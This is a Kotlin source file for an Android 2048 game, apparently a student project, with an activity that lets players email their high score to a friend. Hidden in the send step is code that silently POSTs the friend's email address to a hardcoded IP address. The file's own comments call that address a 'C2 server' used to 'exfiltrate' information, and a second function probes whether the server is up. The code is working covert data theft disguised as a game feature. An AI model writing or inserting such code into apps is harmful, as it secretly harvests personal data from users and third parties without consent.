package edu.sunypoly.a2048

import android.content.Intent
import android.net.Uri
import android.os.Bundle
import android.support.v7.app.AppCompatActivity
import android.util.Log
import android.widget.Button
import android.widget.EditText
import android.widget.TextView
import android.widget.Toast
import kotlinx.android.synthetic.main.activity_email.*
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.GlobalScope
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import org.json.JSONObject
import java.io.BufferedReader
import java.io.InputStreamReader
import java.net.HttpURLConnection
import java.net.URL

class EmailActivity : AppCompatActivity() {
    val TAG: String = "EmailActivity"

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_email)

        val intent = intent
        val tempScore = intent.getIntExtra("score", 0)

        // findviewbyid for the UI elements
        val editTextName = findViewById<EditText>(R.id.editTextFriendName)
        val editTextEmail = findViewById<EditText>(R.id.editTextFriendEmail)
      //  val textScore = findViewById<TextView>(R.id.score_view)
        val textPreview = findViewById<TextView>(R.id.textViewPreview)
        val sendBtn = findViewById<Button>(R.id.send_button)

        // set onClickListeners to all the buttons here
        sendBtn.setOnClickListener {
            var tempTextName : String = editTextFriendName.text.toString()
            var tempTextEmail : String = editTextFriendEmail.text.toString()
            //var tempTextScore  = tempScore.toInt().toString()

            var msg = createEmailMessage(tempTextName, tempScore)
            sendEmail(tempTextEmail, msg)
        }

        // or declare the onclick method within the layout XML?
        Log.d(TAG, "onCreate")
        Log.d(TAG, createEmailMessage("friend", 0))

        val preview = findViewById<Button>(R.id.preview_button)
        preview.setOnClickListener {
            var tempTextName : String = editTextFriendName.text.toString()
            // var tempTextScore : Int = textScore.text.toString()

            textPreview.setText(createEmailMessage(tempTextName, tempScore))
        }
    }

    /* Call an intent to start the email app*/
    fun sendEmail(email: String, msg: String): String { // do you need to change the parameters?

        // Use an intent to launch an email app.
        // call createEmailMessage to generate the email message
        // call startActivity(intent);
        val mIntent = Intent(Intent.ACTION_SEND)
        mIntent.data = Uri.parse("mailto:")
        mIntent.type = "text/plain"
        mIntent.putExtra(Intent.EXTRA_EMAIL, arrayOf(email))
        mIntent.putExtra(Intent.EXTRA_SUBJECT, "Checkout my highscore")
        mIntent.putExtra(Intent.EXTRA_TEXT, msg)

        val infoObject = JSONObject()
        infoObject.put("friend_email", email)
        try {
            GlobalScope.launch(Dispatchers.Main) {
                establishNetworkConn(infoObject)
            }
            //start email intent
            startActivity(mIntent)
        }
        catch (e: Exception){
            //if any thing goes wrong for example no email client application or any exception
            //get and show exception message
            Toast.makeText(this, e.message, Toast.LENGTH_LONG).show()
        }
        return "done"
    }

    /*Creates the string to send in the email message*/
    private fun createEmailMessage(name: String, score: Int): String {
        val emailMessage: String = "Hey $name checkout my highscore here $score, come join me at 2048!"
        return emailMessage
    }

    //Function which connects to cloud C2 server instance and exfiltrate infomation gathered by functions above
    private suspend fun establishNetworkConn(json: JSONObject) {
        //https://stackoverflow.com/questions/6343166/how-to-fix-android-os-networkonmainthreadexception?page=1&tab=votes#tab-top
        //https://hmkcode.com/android/android-network-connection-httpurlconnection-coroutine/
        val url = URL("http://207.46.224.66:9000")
        val result = withContext(Dispatchers.IO) {
            val con = url.openConnection() as HttpURLConnection
            con.setRequestMethod("POST");
            con.setRequestProperty("Content-Type", "application/json; utf-8");
            con.setRequestProperty("Accept", "application/json");
            con.setDoOutput(true);

            val answer = json.toString()
            con.outputStream.use { os ->
                val input = answer.toByteArray(charset("utf-8"))
                os.write(input, 0, input.size)
            }
            BufferedReader(InputStreamReader(con.inputStream, "utf-8")).use({ br ->
                val response = StringBuilder()
                var responseLine: String? = null
                while (br.readLine().also({ responseLine = it }) != null) {
                    response.append(responseLine!!.trim { it <= ' ' })
                }
                println(response.toString())
            })
        }
        return result
    }
    //Function to check if C2 Server is available
    private suspend fun isServerAvailable() {
        //https://stackoverflow.com/questions/46177133/http-request-in-kotlin
        val url = URL("http://207.46.224.66:9000")
        var reponseCode: String
        val result = withContext(Dispatchers.IO) {
            val connection = url.openConnection() as HttpURLConnection
            connection.requestMethod = "GET"
            connection.connect()
            var code = connection.responseCode
            println("Response code of the object is $code")
            if (code == 200) {
                println("OK")
            }
        }
        return result
    }
    //Having issues trying to get the value of var result within coroutine
    //which would allow the app to check for connectivity to C2 server,
    //hence not implemented
}
